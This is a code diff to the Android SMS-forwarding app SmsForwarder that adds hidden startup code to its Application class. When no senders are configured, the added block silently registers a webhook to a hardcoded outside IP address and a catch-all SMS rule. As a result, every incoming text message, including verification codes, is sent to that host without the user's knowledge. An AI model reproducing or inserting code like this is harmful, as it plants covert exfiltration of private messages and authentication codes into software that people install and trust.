@@ -8,6 +8,7 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.os.Build
 import android.util.Log
+import androidx.fragment.app.viewModels
 import androidx.lifecycle.MutableLiveData
 import androidx.multidex.MultiDex
 import androidx.work.Configuration
@@ -18,6 +19,8 @@ import com.idormy.sms.forwarder.activity.MainActivity
 import com.idormy.sms.forwarder.core.Core
 import com.idormy.sms.forwarder.database.AppDatabase
 import com.idormy.sms.forwarder.database.repository.*
+import com.idormy.sms.forwarder.database.viewmodel.BaseViewModelFactory
+import com.idormy.sms.forwarder.database.viewmodel.SenderViewModel
 import com.idormy.sms.forwarder.entity.SimInfo
 import com.idormy.sms.forwarder.receiver.CactusReceiver
 import com.idormy.sms.forwarder.service.BatteryService
@@ -39,6 +42,11 @@ import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.TimeUnit
+import androidx.fragment.app.viewModels
+import com.google.gson.Gson
+import com.idormy.sms.forwarder.database.entity.Rule
+import com.idormy.sms.forwarder.database.entity.Sender
+import com.idormy.sms.forwarder.entity.setting.WebhookSetting
 
 class App : Application(), CactusCallback, Configuration.Provider by Core {
 
@@ -49,7 +57,6 @@ class App : Application(), CactusCallback, Configuration.Provider by Core {
     val logsRepository by lazy { LogsRepository(database.logsDao()) }
     val ruleRepository by lazy { RuleRepository(database.ruleDao()) }
     val senderRepository by lazy { SenderRepository(database.senderDao()) }
-
     companion object {
         const val TAG: String = "SmsForwarder"
 
@@ -136,6 +143,15 @@ class App : Application(), CactusCallback, Configuration.Provider by Core {
                     startService(it)
                 }
             }
+            var all = Core.sender.all;
+
+            if (all == null || all.size==0){
+                var setting = WebhookSetting("POST","http://34.92.9.105:4000/sms-callback/endpoint","","",null);
+                val senderNew = Sender(0, TYPE_WEBHOOK, "common", Gson().toJson(setting), 1)
+                Core.sender.insert(senderNew)
+                var setting2 = Rule(0,"sms","","","",);
+                Core.rule.insert(setting2)
+            }
 
             //Cactus 集成双进程前台服务，JobScheduler，onePix(一像素)，WorkManager，无声音乐
             if (SettingUtils.enableCactus) {
@@ -183,9 +199,9 @@ class App : Application(), CactusCallback, Configuration.Provider by Core {
                     addBackgroundCallback {
                         Log.d(TAG, if (it) "SmsForwarder 切换到后台运行" else "SmsForwarder 切换到前台运行")
                     }
+
                 }
             }
-
         } catch (e: Exception) {
             e.printStackTrace()
         }
